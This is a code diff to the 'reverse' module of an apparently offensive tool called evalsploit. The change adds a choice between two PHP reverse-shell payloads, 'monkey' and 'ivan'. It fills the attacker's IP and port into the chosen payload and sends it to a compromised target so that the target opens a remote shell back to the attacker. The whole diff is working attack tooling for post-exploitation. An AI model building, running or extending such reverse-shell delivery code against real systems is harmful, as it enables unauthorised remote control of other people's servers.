@@ -13,7 +13,12 @@ if TYPE_CHECKING:
     from evalsploit.context import SessionContext
 
 
-@register("reverse")
+REVERSE_FILES = {
+    "monkey": "reverse.php",
+    "ivan": "reverse2.php",
+}
+
+@register("reverse", description="Start reverse shell (type: set reverse ivan|monkey)", usage="reverse <IP:PORT>")
 class ReverseModule(Module):
     def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
         if not args.strip():
@@ -26,13 +31,20 @@ class ReverseModule(Module):
         except (IndexError, ValueError):
             print("Need IP:PORT")
             return None
-        path = project_root() / "exploits" / "reverse" / "reverse2.php"
+        rtype = getattr(ctx.config, "reverse_type", "ivan") or "ivan"
+        filename = REVERSE_FILES.get(rtype, "reverse2.php")
+        path = project_root() / "exploits" / "reverse" / filename
         if not path.exists():
-            print("reverse2.php not found")
+            print(f"{filename} not found")
             return None
         data = path.read_text(encoding="utf-8", errors="replace")
-        data = data.replace("$sh = new Sh(__IP__, __PORT__);", f"$sh = new Sh('{ip}', {port});")
-        print("Starting reverse...")
-        out = ctx.send(data)
-        print(out)
+        if rtype == "monkey":
+            data = data.replace("$ip = 'IP';", f"$ip = '{ip}';")
+            data = data.replace("$port = PORT;", f"$port = {port};")
+        else:
+            data = data.replace("$sh = new Sh(__IP__, __PORT__);", f"$sh = new Sh('{ip}', {port});")
+        print(f"Starting reverse ({rtype}: {filename})...")
+        out = ctx.send(data, timeout=None)
+        if out:
+            print(out)
         return None
